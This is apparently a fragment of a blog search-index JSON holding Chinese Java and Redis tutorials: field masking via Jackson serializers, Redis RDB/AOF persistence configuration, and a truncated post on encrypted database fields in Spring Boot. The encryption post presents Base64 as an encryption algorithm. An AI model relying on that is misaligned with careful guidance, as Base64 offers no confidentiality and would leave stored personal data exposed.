MaskSerializer.class)：该注解的作用就是可自定义序列化，可以用在注解上，方法上，字段上，类上，运行时生效等等，根据提供的序列化类里面的重写方法实现自定义序列化。关于MaskSerializer就是我们自定义序列化实现脱敏的核心实现所在，后面会详细分析。从注解定义可以，我们给脱敏字段使用注解打标识时，需要指定该字段脱敏类型是什么，所以接下来我们还需要定义脱敏类型枚举类，我们系统大概分为两类：系统字段如(姓名，手机号，身份证号…..等等)，自定义字段(婚姻状况，月供金额这些额外信息，会存储在数据库一个JSON字段里)。 public enum MaskEnum { /** * 中文名 */ NAME, /** * 身份证号 */ ID_CARD, /** * 手机号 */ MOBILE, /** * 地址 */ ADDRESS, /** * 电子邮件 */ EMAIL, /** * 银行卡 */ BANK_CARD, /** * 自定义字段 */ CUSTOM_FIELD } 注解和脱敏类型我们都定义好，看样子万事俱备只欠东风啦，我们只需要接下来自定义实现序列化解析器完成脱敏即可，但是你可能忘了文章开头一直强调的：动态灵活，我们的脱敏配置信息不是固定的，而是动态配置保存的，这就意味着一个接口的某个字段上一次调用还需要脱敏，紧接着脱敏配置被改了，再调接口该字段就不再需要脱敏，要求我们做到动态的同时还要保证实时性。这如同需要判断功能菜单权限那样通过切面实现判断是否需要脱敏，将脱敏配置信息上下文贯穿整次请求，这里我们在登录认证的过滤器中实现，因为脱敏配置涉及到角色、组织架构，自然是要登录之后才能进行是否需要脱敏判断。 @Component @Slf4j public class AuthFilter implements Filter { @Autowired private StringRedisTemplate stringRedisTemplate; @Override public void doFilter( ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) //登录认证逻辑 // ........ // 登录验证通过之后，就可以登录用户的公司id，设置脱敏配置上下文 String rule = stringRe","date":"2024-05-14","objectID":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/:2:0","tags":[],"title":"数据脱敏实现：想在哪脱就在哪脱，想脱谁就脱谁！！！","uri":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/"},{"categories":["Java后端"],"content":"3.总结 以上全部就是本期关于数据脱敏知识点的总结介绍啦。 首先介绍了数据脱敏需求的背景、概念和重要性，紧接着我们逐步探讨实现方案，权衡利弊了相关实现选择，最终选择Spring Boot的自带的jackson自定义序列化实现，它的实现原来其实就是在json进行序列化渲染给前端时，进行脱敏，这样可以有效降低性能损耗，并且也不会侵入系统业务层逻辑这样可以保证我们的业务逻辑不会因为数据脱敏出现逻辑错误。与此同时也强调了动态灵活可配置的脱敏信息配置，我们通过拦截器实现脱敏信息上下文设置，在上面思路我们进行代码实现剖析和实操，借助于Hutool工具类提供的脱敏功能，完美实现了字段脱敏。 作者：Shepherd 链接：https://juejin.cn/post/7329141961092186164 来源：稀土掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2024-05-14","objectID":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/:3:0","tags":[],"title":"数据脱敏实现：想在哪脱就在哪脱，想脱谁就脱谁！！！","uri":"/posts/%E6%95%B0%E6%8D%AE%E8%84%B1%E6%95%8F%E5%AE%9E%E7%8E%B0%E6%83%B3%E5%9C%A8%E5%93%AA%E8%84%B1%E5%B0%B1%E5%9C%A8%E5%93%AA%E8%84%B1%E6%83%B3%E8%84%B1%E8%B0%81%E5%B0%B1%E8%84%B1%E8%B0%81/"},{"categories":["Redis"],"content":"背景 有个同学阿里二面，面试官问：redis宕机了，如何恢复数据？ 这位同学当时一脸懵，不知道如何回答。 分析分析这个问题，redis宕机，要想恢复数据，首先redis的数据有没有做持久化，用的是哪种策略，这种策略的机制是什么，有趣点是什么，以及你们是从什么方面考虑用着中机制的 其实面试官就是想考察，你们业务中redis的持久化策略，以及你对持久化策略有没有了解过，还是就直接使用，不管数据会回丢失，反正丢失了都是运维的锅，那你这样基本上GG了 为什么要做持久化 Redis是个基于内存的数据库。那服务一旦宕机，内存中的数据将全部丢失。通常的解决方案是从后端数据库恢复这些数据，但后端数据库有性能瓶颈，如果是大数据量的恢复， 会对数据库带来巨大的压力，严重可能导致mysql宕机 数据库的性能不如Redis。导致程序响应慢。所以对Redis来说，实现数据的持久化，避免从后端数据库中恢复数据，是至关重要的。 持久化策略 官方支持的持久化有四种，如下： RDB（Redis 数据库）：RDB 持久性以指定的时间间隔执行数据集的时间点快照。 AOF（仅追加文件）：AOF 持久性记录服务器接收到的每个写操作。然后可以在服务器启动时再次重播这些操作，从而重建原始数据集。命令使用与 Redis 协议本身相同的格式进行记录。 RDB + AOF：您还可以在同一个实例中组合 AOF 和 RDB。 无持久性：您可以完全禁用持久性。这种策略，一般很少有人使用吧 下面我们对这几种策略，进行详细梳理下 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:0:0","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"RDB RDB 就是 Redis DataBase 的缩写，中文名为快照/内存快照，RDB持久化是把当前进程数据生成快照保存到磁盘上的过程，由于是某一时刻的快照，那么快照中的值要早于或者等于内存中的值。 默认情况下，Redis 将数据集的快照保存在磁盘上名为 dump.rdb 的二进制文件中。 Redis 提供了两个命令来生成 RDB 文件，分别是 save 和 bgsave。 save：在主线程中执行，会导致阻塞； bgsave：创建一个子进程，专门用于写入 RDB 文件，避免了主线程的阻塞，这也是 Redis RDB 文件生成的默认配置。 一般通过 bgsave 命令来执行全量快照，这既提供了数据的可靠性保证，也避免了对 Redis 的性能影响。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:1:0","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"redis.conf中配置RDB 内存快照虽然可以通过技术人员手动执行SAVE或BGSAVE命令来进行，但生产环境下多数情况都会设置其周期性执行条件。 bash复制代码# 周期性执行条件的设置格式为 save \u003cseconds\u003e \u003cchanges\u003e # 默认的设置为： save 900 1 save 300 10 save 60 10000 # 以下设置方式为关闭RDB快照功能 save \"\" 以上三项默认信息设置代表的意义是： 如果900秒内有1条Key信息发生变化，则进行快照； 如果300秒内有10条Key信息发生变化，则进行快照； 如果60秒内有10000条Key信息发生变化，则进行快照。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:1:1","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"Copy-On-Write, COW redis在执行bgsave生成快照的期间，将内存中的数据同步到硬盘的过程可能就会持续比较长的时间，而实际情况是这段时间Redis服务一般都会收到数据写操作请求。那么如何保证快照的完整性呢？ 可能会说，为了保证快照完整性，redis只能处理读操作，不能修改正在执行快照的数据。你想如果这样？为了快照而暂停写操作，同时候你的业务会受到很大的影响，是不可接受的，那有其他方案吗？ Redis 就会借助操作系统提供的写时复制技术（Copy-On-Write, COW），在执行快照的同时，正常处理写操作。 bgsave 子进程是由主线程 fork 生成的，可以共享主线程的所有内存数据。bgsave 子进程运行后，开始读取主线程的内存数据，并把它们写入 RDB 文件。 此时，如果主线程对这些数据也都是读操作（例如图中的键值对 A），那么，主线程和 bgsave 子进程相互不影响。但是，如果主线程要修改一块数据（例如图中的键值对 C），那么，这块数据就会被复制一份，生成该数据的副本（键值对 C’）。然后，主线程在这个数据副本上进行修改。同时，bgsave 子进程可以继续把原来的数据（键值对 C）写入 RDB 文件。 写时复制机制保证快照期间数据可修改 这既保证了快照的完整性，也允许主线程同时对数据进行修改，避免了对正常业务的影响。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:1:2","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"快照的频率如何把握 对于快照来说，所谓“连拍”就是指连续地做快照。这样一来，快照的间隔时间变得很短，即使某一时刻发生宕机了，因为上一时刻快照刚执行，丢失的数据也不会太多。但是，这其中的快照间隔时间就很关键了。如下图： 为了尽可能保证在宕机的情况下，保证数据尽量不丢失，比如：一秒一次快照，那丢失的数据也是一秒。这看上去很美好，其实为带来很大的问题，如果频繁地执行全量快照，也会带来两方面的开销 一方面，频繁将全量数据写入磁盘，会给磁盘带来很大压力，多个快照竞争有限的磁盘带宽，前一个快照还没有做完，后一个又开始做了，容易造成恶性循环。 另一方面，bgsave 子进程需要通过 fork 操作从主线程创建出来。虽然，子进程在创建后不会再阻塞主线程，但是，fork 这个创建过程本身会阻塞主线程，而且主线程的内存越大，阻塞时间越长。如果频繁 fork 出 bgsave 子进程，这就会频繁阻塞主线程了 那这个频率怎么控制呢？这需要根据业务自身的情况，决定快照的频率。比如笔者：我们目前的使用的策略是，关闭系统的自动快照功能，就是 设置 save \"\" , 定时凌晨连接redis，手动执行bgsave，进行快照生成。可能有人说，如果执行这样的策略，数据丢失就是一天的，对，你说的对，但是我们的业务丢失一天的数据也没关系，这是业务能容忍的 ，在生产的情况下，redis的稳定性相当高，基本上不会宕机，出现宕机的情况，也是因为服务器自身的问题，导致机器重启，redis产生数据丢失。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:1:3","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"优缺点 优点 RDB文件是某个时间节点的快照，默认使用LZF算法进行压缩，压缩后的文件体积远远小于内存大小，适用于备份、全量复制等场景； Redis加载RDB文件恢复数据要远远快于AOF方式； 缺点 RDB方式实时性不够，无法做到秒级的持久化； 每次调用bgsave都需要fork子进程，fork子进程属于重量级操作，频繁执行成本较高； RDB文件是二进制的，没有可读性，AOF文件在了解其结构的情况下可以手动修改或者补全； 总结：rdb数据恢复速度非常快，就是无法做到秒级的持久化 那有其他方式做到秒级的持久化吗？Aof ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:1:4","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"AOF AOF 持久性记录服务器接收到的每个写操作。然后可以在服务器启动时再次重播这些操作，从而重建原始数据集。命令使用与 Redis 协议本身相同的格式进行记录 Redis 是先执行命令，把数据写入内存，然后才记录日志 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:0","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"AOF日志内容 我们以 Redis 收到“set testkey 1”命令后记录的日志为例，看看 AOF 日志的内容， 日志格式说明 *3表示当前命令有三个部分，每部分都是由$+数字开头，后面紧跟着具体的命令、键或值。这里，数字表示这部分中的命令、键或值一共有多少字节。例如，$3 set表示这部分有 3 个字节，也就是set命令 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:1","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"redis.conf中配置AOF 默认情况下，Redis是没有开启AOF的，可以通过配置redis.conf文件来开启AOF持久化，关于AOF的配置如下： yaml复制代码# appendonly参数开启AOF持久化 appendonly no # AOF持久化的文件名，默认是appendonly.aof appendfilename \"appendonly.aof\" # AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的 dir ./ # 同步策略 # appendfsync always appendfsync everysec # appendfsync no # aof重写期间是否同步 no-appendfsync-on-rewrite no # 重写触发配置 auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb # 加载aof出错如何处理 aof-load-truncated yes # 文件重写策略 aof-rewrite-incremental-fsync yes ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:2","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"写回策略 AOF 机制给我们提供了三个选择，也就是 AOF 配置项 appendfsync 的三个可选值。 Always，同步写回：每个写命令执行完，立马同步地将日志写回磁盘； Everysec，每秒写回：每个写命令执行完，只是先把日志写到 AOF 文件的内存缓冲区，每隔一秒把缓冲区中的内容写入磁盘； No，操作系统控制的写回：每个写命令执行完，只是先把日志写到 AOF 文件的内存缓冲区，由操作系统决定何时将缓冲区内容写回磁盘。 针对避免主线程阻塞和减少数据丢失问题，这三种写回策略都无法做到两全其美。我们来分析下其中的原因。 “同步写回”可以做到基本不丢数据，但是它在每一个写命令后都有一个慢速的落盘操作，不可避免地会影响主线程性能； 虽然“操作系统控制的写回”在写完缓冲区后，就可以继续执行后续的命令，但是落盘的时机已经不在 Redis 手中了，只要 AOF 记录没有写回磁盘，一旦宕机对应的数据就丢失了； “每秒写回”采用一秒写回一次的频率，避免了“同步写回”的性能开销，虽然减少了对系统性能的影响，但是如果发生宕机，上一秒内未落盘的命令操作仍然会丢失。所以，这只能算是，在避免影响主线程性能和避免数据丢失两者间取了个折中。 我把这三种策略的写回时机，以及优缺点汇总在了一张表格里，以方便你随时查看。 配置项 写回时机 优点 缺点 Always 同步写回 可靠性高，数据基本不丢失 每个写命令都要落盘，性能影响较大 Everysec 每秒写回 性能适中 宕机时丢失1秒内的数据 NO 操作系统控制的写回 性能好 宕机时丢失数据较多 根据系统对高性能和高可靠性的要求，来选择使用哪种写回策略了。总结一下就是： 想要获得高性能，就选择 No 策略； 如果想要得到高可靠性保证，就选择 Always 策略； 如果允许数据有一点丢失，又希望性能别受太大影响的话，那么就选择 Everysec 策略。 虽然AOF策略，能保证秒级数据丢失，但是随着redis的长时间运行，aof文件会越来越大，如果宕机，进行数据恢复的时候速度是特别慢，影响业务，那有什么好的发案处理吗？aof日志重写 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:3","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"AOF日志重写 AOF 文件是以追加的方式，逐一记录接收到的写命令的。当一个键值对被多条写命令反复修改时，AOF 文件会记录相应的多条命令。但是，在重写的时候，是根据这个键值对当前的最新状态，为它生成对应的写入命令。这样一来，一个键值对在重写日志中只用一条命令就行了，而且，在日志恢复时，只用执行这条命令，就可以直接完成这个键值对的写入了。 重写机制具有“多变一”功能。所谓的“多变一”，也就是说，旧日志文件中的多条命令，在重写后的新日志中变成了一条命令，例如： 我们对列表先后做了 6 次修改操作后，列表的最后状态是[“D”, “C”, “N”]，此时，只用 LPUSH u:list “N”, “C”, “D”这一条命令就能实现该数据的恢复，这就节省了五条命令的空间。对于被修改过成百上千次的键值对来说，重写能节省的空间当然就更大了。 不过，虽然 AOF 重写后，日志文件会缩小，但是，要把整个数据库的最新数据的操作日志都写回磁盘，仍然是一个非常耗时的过程。那这个过程，会阻塞主线程吗 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:4","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"AOF重写会阻塞吗 AOF重写过程是由后台进程bgrewriteaof来完成的。主线程fork出后台的bgrewriteaof子进程，fork会把主线程的内存拷贝一份给bgrewriteaof子进程，这里面就包含了数据库的最新数据。然后，bgrewriteaof子进程就可以在不影响主线程的情况下，逐一把拷贝的数据写成操作，记入重写日志。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:5","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"优缺点 优点 数据能做到秒级丢失，也就是说使用了aof这种机制，能做到最多丢失一秒的数据 缺点 恢复数据比较慢，虽然aof日志重写，可以减小文件，但是速度还是很慢 那有没有一种机制，能做到秒级丢失，恢复速度又比较快呢？RDB和AOF混合方式 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:2:6","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Redis"],"content":"RDB和AOF混合方式 Redis 4.0 中提出了一个混合使用 AOF 日志和内存快照的方法。简单来说，内存快照以一定的频率执行，在两次快照之间，使用 AOF 日志记录这期间的所有命令操作。 这样一来，快照不用很频繁地执行，这就避免了频繁 fork 对主线程的影响。而且，AOF 日志也只用记录两次快照间的操作，也就是说，不需要记录所有操作了，因此，就不会出现文件过大的情况了，也可以避免重写开销。 如下图所示，T1 和 T2 时刻的修改，用 AOF 日志记录，等到第二次做全量快照时，就可以清空 AOF 日志，因为此时的修改都已经记录到快照中了，恢复时就不再用日志了。 内存快照和AOF混合使用 这个方法既能享受到 RDB 文件快速恢复的好处，又能享受到 AOF 只记录操作命令的简单优势，颇有点“鱼和熊掌可以兼得”的感觉，建议你在实践中用起来。 总结 Rdb、Aof两种持久化机制各有优缺点，需要根据自己的实际业务来衡量，到底使用哪种机制，最能满足当下业务，我的建议 数据不能丢失时，内存快照和 AOF 的混合使用是一个很好的选择； 如果允许分钟级别的数据丢失，可以只使用 RDB； 如果只用 AOF，优先使用 everysec 的配置选项，因为它在可靠性和性能之间取了一个平衡。 作者：柯柏技术笔记 链接：https://juejin.cn/post/7342480215533404170 来源：稀土掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2024-05-13","objectID":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/:3:0","tags":[],"title":"Redis宕机了，如何恢复数据","uri":"/posts/redis%E5%AE%95%E6%9C%BA%E4%BA%86%E5%A6%82%E4%BD%95%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/"},{"categories":["Java后端"],"content":"1.概述 近来我们都在围绕着使用Spring Boot开发业务系统时如何保证数据安全性这个主题展开总结，当下大部分的B/S架构的系统也都是基于Spring Boot + SpringMVC三层架构开发的，之前我们总结了在接口层面如何加固数据安全性：Spring Boot如何优雅提高接口数据安全性，可以认为是在SpringMVC的三层架构中的controller层(逻辑控制层)对接口数据进行安全处理操作，更直接点说就是在接口请求参数传入进行逻辑处理或者响应参数输出到页面展示之前进行数据处理的，所以只是在SpringMVC三层架构中的一层中进行安全加固，还不是很稳固，接下来今天我们就再来讲讲在SpringMVC三层架构另一层中如何进行数据安全加固，在进入今天主题之前先来看看什么是SpringMVC架构？ 什么是SpringMVC三层架构？ SpringMVC的工程结构一般来说分为三层，自下而上是Modle层（模型，数据访问层）、Cotroller层（控制，逻辑控制层）、View层（视图，页面显示层），其中Modle层分为两层：dao层、service层，MVC架构分层的主要作用是解耦。采用分层架构的好处，普遍接受的是系统分层有利于系统的维护，系统的扩展。就是增强系统的可维护性和可扩展性。对于Spring这样的框架，（View\\Web）表示层调用控制层（Controller），控制层调用业务层（Service），业务层调用数据访问层（Dao） 可以这么说，现在90%以上的业务系统都是基于该三层架构模式开发的，这种架构模式也有人说是设计模式中一种，可见其重要性不言而喻，所以我们需重视。 我们也都知道在日常开发系统过程中，数据安全是非常重要的。特别是在当今互联网时代，个人隐私安全极其重要，一旦个人用户数据遭到攻击泄露，将会造成灾难级的事故问题。所有之前我们基于接口层进行数据安全处理是远远不够的，今天我们就来谈谈如何Model层(数据访问层)怎样做到优雅数据加密存储、模糊匹配及其脱敏展示，本文的主题：数据加密存储、模糊匹配和脱敏展示。 银行系统对数据安全性的要求在业务系统中是首屈一指的，所以今天我们就以常见的个人银行账户数据：密码、手机号、详细地址、银行卡号等信息字段为例，进行主题的宣讲与浅析。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:1:0","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"2.数据加密存储 我们之前总结的是在接口层进行数据加解密传输，也强调过这种方式保证不了数据的绝对安全，只是有效提高接口数据安全性，抬高数据被抓取的门槛而已。所以接下来我们就来讲述一下如何在数据的源头存储层保障其安全。我们都知道一些核心私密字段，比如说密码，手机号等在数据库层存储就不能明文存储，必须加密存储保证即使数据库泄露了也不会轻易曝光数据。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:2:0","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"2.1 优雅实现数据库字段加解密原理 Mybatis-plus提供企业高级特性就有支持数据加密解密，不过是收费的。。。但是我们可以细细探究其原理进行功能的自我实现。 其实在我们上面推荐的快速开发框架中就已经优雅整合了数据加解密功能了，EncryptTypeHandler：实现数据库的字段加密与解密。 默认提供了基于base64加密算法Base64EncryptService和AES加密算法AESEncryptService，当然业务侧也可以自定义加密算法，这需要实现接口EncryptService，并把实现类注入到容器中即可。加密功能核心逻辑 @Bean @ConditionalOnMissingBean(EncryptService.class) public EncryptService encryptService() { Algorithm algorithm = encryptProperties.getAlgorithm(); EncryptService encryptService; switch (algorithm) { case BASE64: encryptService = new Base64EncryptService(); break; case AES: encryptService = new AESEncryptService(); break; default: encryptService = null; } return encryptService; } 接下来就可以基于加密算法，扩展mybatis的typeHandler对实体字段数据进行加密解密了：EncryptTypeHandler public class EncryptTypeHandler\u003cT\u003e extends BaseTypeHandler\u003cT\u003e { @Resource private EncryptService encryptService; @Override public void setNonNullParameter(PreparedStatement ps, int i, Object parameter, JdbcType jdbcType) throws SQLException { ps.setString(i, encryptService.encrypt((String)parameter)); } @Override public T getNullableResult(ResultSet rs, String columnName) throws SQLException { String columnValue = rs.getString(columnName); return StrUtil.isBlank(columnValue) ? (T)columnValue : (T)encryptService.decrypt(columnValue); } @Override public T getNullableResult(ResultSet rs, int columnIndex) throws SQLException { String columnValue = rs.getString(columnIndex); return StrUtil.isBlank(columnValue) ? (T)columnValue : (T)encryptService.decrypt(columnValue); } @Override public T getNullableResult(CallableStatement cs, int columnIndex) throws SQLException { String columnValue = cs.getString(columnIndex); return StrUtil.isBlank(columnValue) ? (T)columnValue : (T)encryptService.decrypt(columnValue); } } ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:2:1","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"2.2 加密与解密示例 首先创建一张user表： CREATE TABLE `user` ( `id` bigint(20) NOT NULL, `name` varchar(255) DEFAULT NULL COMMENT '姓名', `phone` varchar(255) DEFAULT NULL COMMENT '手机号', `id_card` varchar(255) DEFAULT NULL COMMENT '身份证号', `bank_card` varchar(255) DEFAULT NULL COMMENT '银行卡号', `address` varchar(255) DEFAULT NULL COMMENT '住址', PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; 这时候我们正常插入一条数据： @Test public void test() { User user = new User(); user.setName(\"shepherd\"); user.setMobile(\"17812345678\"); user.setIdCard(\"213238199601182111\"); user.setBankCard(\"3222022046741500\"); user.setAddress(\"杭州市余杭区未来科技城\"); userDAO.insert(user); } 数据库存储查询结果如下： id name mobile id_card bank_card address 1567402046481436673 shepherd 17812345678 213238199601182111 3222022046741500 杭州市余杭区未来科技城 这就是我们平时不加密存储查询的结果，这里id是通过分布式id算法自动生成的哈。 接下来我们来看看实现对数据的加密，只需要在配置文件配置使用哪一种加密算法和在实体类的字段属性加上注解@TableField(typeHandler = EncryptTypeHandler.class)即可。 这里我们使用aes加密算法： ptc: encrypt: algorithm: aes 实体类： @Data @TableName(autoResultMap = true) public class User { private Long id; private String name; @TableField(typeHandler = EncryptTypeHandler.class) private String mobile; @TableField(typeHandler = EncryptTypeHandler.class) private String idCard; @TableField(typeHandler = EncryptTypeHandler.class) private String bankCard; @TableField(typeHandler = EncryptTypeHandler.class) private String address; } 再次插入数据，数据库存储查询结果如下： id name mobile id_card bank_card address 1567402046481436673 shepherd 9MgWngwLcd/vbYYYpG9pGQ== 